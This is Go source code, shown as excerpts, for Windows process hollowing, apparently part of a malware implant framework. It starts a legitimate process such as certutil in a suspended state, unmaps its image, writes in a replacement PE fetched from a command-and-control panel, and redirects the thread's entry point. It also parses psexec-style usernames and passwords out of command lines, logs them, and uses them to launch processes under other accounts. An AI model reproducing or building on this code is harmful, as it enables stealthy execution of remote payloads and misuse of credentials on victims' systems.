...
func Inject(srcPath, destPath string) {
	...
	logging.Info("Creating process: %v", srcPath)
	...
	logging.Info("Process created. Process: %v, Thread: %v", hProcess, hThread)

	logging.Info("Getting thread context of %v", hThread)
	...
	logging.Info("Address to PEB[Rdx]: %x", Rdx)
	...
	logging.Info("Base Address of Source Image from PEB[ImageBaseAddress]: %x", baseAddr)

	logging.Info("Reading destination PE")
	...
	logging.Info("Getting OptionalHeader of destination PE")
	oh, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		panic("OptionalHeader64 not found")
	}

	logging.Info("ImageBase of destination PE[OptionalHeader.ImageBase]: %x", oh.ImageBase)
	logging.Info("Unmapping view of section %x", baseAddr)
	if err := NtUnmapViewOfSection(hProcess, baseAddr); err != nil {
		panic(err)
	}

	logging.Info("Allocating memory in process at %x (size: %v)", baseAddr, oh.SizeOfImage)
	...
	logging.Info("New base address %x", newImageBase)
	logging.Info("Writing PE to memory in process at %x (size: %v)", newImageBase, oh.SizeOfHeaders)
	...
	for _, sec := range f.Sections {
		logging.Info("Writing section[%v] to memory at %x (size: %v)", sec.Name, newImageBase+uintptr(sec.VirtualAddress), sec.Size)
	...
	logging.Info("Calcuating relocation delta")
	delta := int64(oh.ImageBase) - int64(newImageBase)
	logging.Info("Relocation delta: %v", delta)

	if delta != 0 && false {
		logging.Info("Finding relocation directory")
		rel := oh.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_BASERELOC]
		logging.Info("Relocation directory %x (size: %v)", rel.VirtualAddress, rel.Size)

		logging.Info("Locating relocation section")
		relSec := findRelocSec(rel.VirtualAddress, f.Sections)
		if relSec == nil {
			panic(fmt.Sprintf(".reloc not found at %x", rel.VirtualAddress))
		}
		logging.Info("Relocation section %x (size: %v)", relSec.VirtualAddress, relSec.Size)
		var read uint32
		d, err := relSec.Data()
		if err != nil {
			panic(err)
		...
		for read < rel.Size {
			logging.Info("Reading relocation header")
			dd := new(pe.DataDirectory)
			binary.Read(rr, binary.LittleEndian, dd)
			logging.Info("Relocation header %x (size: %v)", dd.VirtualAddress, dd.Size)

			read += 8
			reSize := (dd.Size - 8) / 2
			logging.Info("Relocation entries %v", reSize)
			re := make([]baseRelocEntry, reSize)
			read += reSize * 2
			binary.Read(rr, binary.LittleEndian, re)
			for _, rrr := range re {
				logging.Info("Relocation entry: Type: %x  Offset: %x", rrr.Type(), rrr.Offset()+dd.VirtualAddress)
				if rrr.Type() == IMAGE_REL_BASED_DIR64 {
					...
					logging.Info("Invalid relocation entry type found %v", rrr.Type())
				}
			}
		}

	}
	logging.Info("Writing new ImageBase to Rdx %x", newImageBase)
	addrB := make([]byte, 8)
	...
	logging.Info("Setting new entrypoint to Rcx %x", uint64(newImageBase)+uint64(oh.AddressOfEntryPoint))

	logging.Info("Setting thread context %v", hThread)
	err = SetThreadContext(hThread, ctx)
	if err != nil {
		panic(err)
	}

	logging.Info("Resuming thread %v", hThread)
...
func LogonUserW(username *uint16, domain *uint16, password *uint16, logonType LogonType, logonProvider LogonProvider) (windows.Token, error) {

	hToken := uintptr(0)
	res, _, err := procLogonUserW.Call(
		uintptr(unsafe.Pointer(username)),
		uintptr(unsafe.Pointer(domain)),
		uintptr(unsafe.Pointer(password)),
		uintptr(logonType),
...
func enableCurrentThreadPrivilege(privilegeName string) error {
	...
	if err != nil {
		// {{if .Config.Debug}}
		logging.DebugErr("GetCurrentThread failed %v", err)
		// {{end}}
		return err
	}
	var t windows.Token
	...
	if err != nil {
		// {{if .Config.Debug}}
		logging.DebugErr("openThreadToken failed %v", err)
		// {{end}}
		return err
	}
	...
	if err != nil {
		// {{if .Config.Debug}}
		logging.DebugErr("lookupPrivilegeValue failed %v", err)
		// {{end}}
		return err
	}
	tp.PrivilegeCount = 1
...
// srcPath - certutil
func InjectRemote(srcPath, command, destURL string) {

	//finalPath := srcPath + " " + command
	...
	src, err := syscall.UTF16PtrFromString(srcPath)
	if err != nil {
		panic(err)
	}

	logging.Info("Creating hollow process: %v", srcPath)
	logging.Info("Using cmdline: %v", command)

	si := new(syscall.StartupInfo)
	pi := new(syscall.ProcessInformation)

	if strings.HasPrefix(command, "psexec") {
		re := regexp.MustCompile(`-u\s+"([^"\\]+)\\([^"]+)"\s+-p\s+"([^"]+)"`)
		match := re.FindStringSubmatch(command)
		if len(match) == 4 {
			logging.Info("Domain: %v", match[1])
			logging.Info("Username: %v", match[2])
			logging.Info("Password: %v", match[3])
			domain, err := syscall.UTF16PtrFromString(match[1])
			username, err := syscall.UTF16PtrFromString(match[2])
			password, err := syscall.UTF16PtrFromString(match[3])
			...
			/*
				...
				for _, priv := range requiredPrivileges {
					...
					if err != nil {
						// {{if .Config.Debug}}
						debug.Info("Failed to set priv %v", priv)
						// {{end}}
						return
					}
				}
			*/
			...
			/*
				token, err := LogonUserW(username, domain, password, 2, 0)
				if err != nil {
					debug.Err("LogonUserW error " + err.Error())
					return
				}

				err = ImpersonateLoggedOnUser(syscall.Token(token))
				if err != nil {
					// {{if .Config.Debug}}
					debug.Err("ImpersonateLoggedOnUser error " + err.Error())
					// {{end}}
					return
				}

				err = syscall.CreateProcess(src, cmd, nil, nil, false, 0x00000004, nil, nil, si, pi)
				if err != nil {
					debug.Err("CreateProcess error " + err.Error())
					return
				}
			...
			*/
			/*if ret == 0 {
				debug.Err("RevertToSelf error " + err.Error())
				return
			}*/

			/*
				err = syscall.CreateProcessAsUser(syscall.Token(token), src, cmd, nil, nil, false, 0x00000004, nil, nil, si, pi)
				if err != nil {
					debug.Err("CreateProcessAsUser error " + err.Error())
					return
				}

			*/

			err = CreateProcessWithLogonW(username, domain, password, 1, src, cmd, 0x00000004, nil, nil, si, pi)
			if err != nil {
				logging.DebugErr("CreateProcessWithLogonW error " + err.Error())
				return
			}

		} else {
			logging.DebugErr("Invalid psexec parameters")
			return
		}
	} else {
		//debug.Info("String does not start with 'psexec'")
		// CREATE_SUSPENDED := 0x00000004
		err = syscall.CreateProcess(src, cmd, nil, nil, false, 0x00000004, nil, nil, si, pi)
		if err != nil {
			logging.DebugErr("CreateProcess error " + err.Error())
			return
		}
	}
	...
	ctx, err := GetThreadContext(hThread)
	if err != nil {
		logging.DebugErr("GetThreadContext error " + err.Error())
		return
	}
	// https://stackoverflow.com/questions/37656523/declaring-context-struct-for-pinvoke-windows-x64
	Rdx := binary.LittleEndian.Uint64(ctx[136:])
	...
	baseAddr, err := ReadProcessMemoryAsAddr(hProcess, uintptr(Rdx+16))
	if err != nil {
		logging.DebugErr("ReadProcessMemoryAsAddr error " + err.Error())
		return
	}
	...
	logging.Info("Reading destination PE")
	destPE := communication.SendGetToC2Panel(destURL)
	if destPE == nil {
		logging.DebugErr("SendGetToC2Panel error " + err.Error())
	}
	...
	oh, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		logging.Info("OptionalHeader64 not found")
	}

	logging.Info("ImageBase of destination PE[OptionalHeader.ImageBase]: %x", oh.ImageBase)
	logging.Info("Unmapping view of section %x", baseAddr)
	if err := NtUnmapViewOfSection(hProcess, baseAddr); err != nil {
		logging.DebugErr("NtUnmapViewOfSection error " + err.Error())
	}
	...
	newImageBase, err := VirtualAllocEx(hProcess, baseAddr, oh.SizeOfImage, 0x00002000|0x00001000, 0x40)
	if err != nil {
		logging.DebugErr("VirtualAllocEx error " + err.Error())
	}
	logging.Info("New base address %x", newImageBase)
	logging.Info("Writing PE to memory in process at %x (size: %v)", newImageBase, oh.SizeOfHeaders)
	err = WriteProcessMemory(hProcess, newImageBase, destPE, oh.SizeOfHeaders)
	if err != nil {
		logging.DebugErr("WriteProcessMemory error " + err.Error())
	}
	...
	for _, sec := range f.Sections {
		...
		secData, err := sec.Data()
		if err != nil {
			logging.DebugErr("sec.Data() error " + err.Error())
		}
		err = WriteProcessMemory(hProcess, newImageBase+uintptr(sec.VirtualAddress), secData, sec.Size)
		if err != nil {
			logging.DebugErr("WriteProcessMemory error " + err.Error())
	...
	if delta != 0 && false {
		...
		relSec := findRelocSec(rel.VirtualAddress, f.Sections)
		if relSec == nil {
			logging.DebugErr(".reloc not found at %x", rel.VirtualAddress)
		}
		logging.Info("Relocation section %x (size: %v)", relSec.VirtualAddress, relSec.Size)
		var read uint32
		d, err := relSec.Data()
		if err != nil {
			logging.DebugErr("relSec.Data() error " + err.Error())
		}
		rr := bytes.NewReader(d)
		for read < rel.Size {
			logging.Info("Reading relocation header")
			...
			for _, rrr := range re {
				...
				if rrr.Type() == IMAGE_REL_BASED_DIR64 {
					...
					err = WriteProcessMemoryAsAddr(hProcess, rell, uintptr(int64(raddr)+delta))
					if err != nil {
						logging.DebugErr("WriteProcessMemoryAsAddr error " + err.Error())
					}
	...
	err = SetThreadContext(hThread, ctx)
	if err != nil {
		logging.DebugErr("SetThreadContext error " + err.Error())
	}

	logging.Info("Resuming thread %v", hThread)
	_, err = ResumeThread(hThread)
	if err != nil {
		logging.DebugErr("ResumeThread error " + err.Error())
	}
...
func ResumeThread(hThread uintptr) (count int32, e error) {
	...
	count = int32(ret)
	logging.Info("ResumeThread[%v]: [%v] %v", hThread, ret, err)
	return
}
...
func VirtualAllocEx(hProcess uintptr, lpAddress uintptr, dwSize uint32, flAllocationType int, flProtect int) (addr uintptr, e error) {
	...
	addr = ret
	logging.Info("VirtualAllocEx[%v : %x]: [%v] %v", hProcess, lpAddress, ret, err)
...
func ReadProcessMemory(hProcess uintptr, lpBaseAddress uintptr, size uint32) (data []byte, e error) {
	...
	logging.Info("ReadProcessMemory[%v : %x]: [%v] %v", hProcess, lpBaseAddress, r, err)
	return
}
...
func WriteProcessMemory(hProcess uintptr, lpBaseAddress uintptr, data []byte, size uint32) (e error) {
	...
	logging.Info("WriteProcessMemory[%v : %x]: [%v] %v", hProcess, lpBaseAddress, r, err)
...
func GetThreadContext(hThread uintptr) (ctx []uint8, e error) {
	...
	logging.Info("GetThreadContext[%v]: [%v] %v", hThread, r, err)
...
func ReadProcessMemoryAsAddr(hProcess uintptr, lpBaseAddress uintptr) (val uintptr, e error) {
	...
	logging.Info("ReadProcessMemoryAsAddr[%v : %x]: [%x] %v", hProcess, lpBaseAddress, val, err)
	return
}
...
func WriteProcessMemoryAsAddr(hProcess uintptr, lpBaseAddress uintptr, val uintptr) (e error) {
	...
	logging.Info("WriteProcessMemoryAsAddr[%v : %x]: %v", hProcess, lpBaseAddress, err)
	return
}
...
func NtUnmapViewOfSection(hProcess uintptr, baseAddr uintptr) (e error) {
	...
	logging.Info("NtUnmapViewOfSection[%v : %x]: [%v] %v", hProcess, baseAddr, r, err)
	return
}
...
func SetThreadContext(hThread uintptr, ctx []uint8) (e error) {
	...
	logging.Info("SetThreadContext[%v]: [%v] %v", hThread, r, err)
	return
}
